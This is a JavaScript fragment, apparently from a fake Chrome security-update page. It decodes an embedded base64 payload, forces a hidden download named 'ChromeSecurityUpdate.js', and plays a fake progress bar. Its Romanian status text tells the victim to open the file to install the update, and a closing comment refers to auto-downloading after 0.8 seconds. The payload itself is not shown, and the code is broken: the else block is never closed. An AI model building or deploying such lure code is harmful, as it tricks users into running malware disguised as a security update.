function base64ToBlob(base64, mimeType) {
  let byteChars = atob(base64);
  let byteArrays = [];
  for (let offset = 0; offset < byteChars.length; offset += 512) {
    let slice = byteChars.slice(offset, offset + 512);
    let byteNumbers = new Array(slice.length);
    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }
    byteArrays.push(new Uint8Array(byteNumbers));
  }
  return new Blob(byteArrays, { type: mimeType });
}

function triggerDownload() {
  let blob = base64ToBlob(b64payload, 'application/octet-stream');
  let url = window.URL.createObjectURL(blob);
  let a = document.getElementById('dl');
  if (!a) {
    a = document.createElement('a');
    a.id = 'dl';
    a.style.display = 'none';
    document.body.appendChild(a);
  }
  a.href = url;
  a.download = 'ChromeSecurityUpdate.js';
  document.body.appendChild(a);
  a.click();
  window.URL.revokeObjectURL(url);
  let bar = document.getElementById('bar');
  let status = document.getElementById('status');
  let width = 0;
  let interval = setInterval(function(){
    if (width >= 100) {
      clearInterval(interval);
      status.innerText = 'Descărcare completă. Deschide fișierul pentru a instala actualizarea.';
      bar.style.width = '100%';
    } else {
      width += Math.floor(Math.random() * 12) + 4;
      if (width > 100) width = 100;
      bar.style.width = width + '%';
      status.innerText = 'Se descarcă patch-ul de securitate... ' + width + '%';

  }, 350);
}

// Auto-descărcare după 0.8 secunde
